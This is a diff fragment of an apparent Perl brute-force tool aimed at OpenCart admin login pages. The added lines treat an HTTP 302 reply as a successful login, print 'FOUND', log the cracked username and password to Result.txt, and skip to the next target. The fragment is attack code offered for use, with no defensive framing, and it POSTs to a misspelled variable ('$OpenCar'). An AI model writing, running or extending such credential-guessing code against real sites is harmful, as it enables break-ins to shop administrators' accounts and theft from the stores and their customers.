@@ -396,6 +396,14 @@ $OpenCart= $site  . '/admin/index.php';
 $ocbrute = POST $OpenCar, [username => $ocuser, password => $ocpass,];
 $response = $ua->request($ocbrute);
 $stat = $response->status_line;
+if ($stat =~ /302/){
+print color('bold white'),"- ";
+print color('bold green'),"FOUND\n";
+print color('reset');
+open(TEXT, ">>Result.txt");
+print TEXT "$OpenCar => User: $ocuser Pass: $ocpass\n";
+close (TEXT);
+next OUTER;
 }
-
+}
 }
